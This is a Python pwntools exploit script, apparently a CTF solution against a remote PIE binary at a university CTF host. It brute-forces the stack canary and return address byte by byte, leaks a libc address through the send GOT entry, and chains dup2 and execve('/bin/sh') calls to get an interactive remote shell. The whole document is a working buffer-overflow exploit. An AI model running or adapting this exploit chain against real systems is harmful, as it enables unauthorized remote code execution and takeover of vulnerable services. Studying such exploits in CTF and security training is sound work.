# Bruteforce Canary Value and base address
from pwn import *

pie = ELF('./pie')

rep = 0x40
# EBP can also be bruteforced by the following code, and EBP is as vital as canary
# canary_ebp_ret = b''
# for i in range(20):
#     for c in range(256):
#         io = remote('pwn1.0ops.sjtu.cn', 10007, level='error')
#         # io = remote('127.0.0.1', 10006, level='error')
#         payload = b'A' * rep + canary_ebp_ret + bytearray([c])
#         #print(len(payload))
        
#         io.sendline(payload)
#         x = io.recvall()
#         io.close()
#         if b'again' in x:
#             print(f"canary byte {i}: {hex(c)}")
#             canary_ebp_ret += bytearray([c])
#             break

canary_ebp_ret = b'\x00\x92\xeb\x0f\x00\x00\x00\x00\x00@`V\x04\xee\xc7\xffd!`V' # Need updates for a certain period of time

canary_ebp = canary_ebp_ret[0:16]
ret = u32(canary_ebp_ret[16:])

base = ret - 0x1164
fd = 4
rtn_loc = 0x115c + base

io = remote('pwn1.0ops.sjtu.cn', 10007, level='error')

print(io.recvline())
payload1 = b'A'*rep + canary_ebp + p32(base + pie.plt['send']) + p32(rtn_loc) + p32(4) + p32(base + pie.got['send']) + p32(4) + p32(0)
io.sendline(payload1)

# send: 0x4a0
# libc_start_main: 0x550

sendaddr = io.recv(4)
print(hex(u32(sendaddr)))

libc = ELF('./libc6_2.23-0ubuntu11.2_i386.so')

libc_base = u32(sendaddr) - libc.symbols['send']
print(hex(libc_base))

dup2 = libc_base + libc.symbols['dup2'] 
bin_sh = libc_base + next(libc.search(b'/bin/sh\x00'))
execve = libc_base + libc.symbols['execve']

stdout_fd = 1
stdin_fd = 0

payload2 = b'A' * rep + canary_ebp + p32(dup2) + p32(rtn_loc) + p32(fd) + p32(stdin_fd) + p32(0)

io.sendline(payload2)

print(io.recvline())

payload3 = b'A' * rep + canary_ebp + p32(dup2) + p32(rtn_loc) + p32(fd) + p32(stdout_fd) + p32(0)

io.sendline(payload3)

print(io.recvline())

payload4 = b'A' * rep + canary_ebp + p32(execve) + p32(0) + p32(bin_sh) + p32(0) + p32(0)

io.sendline(payload4)
print(io.interactive())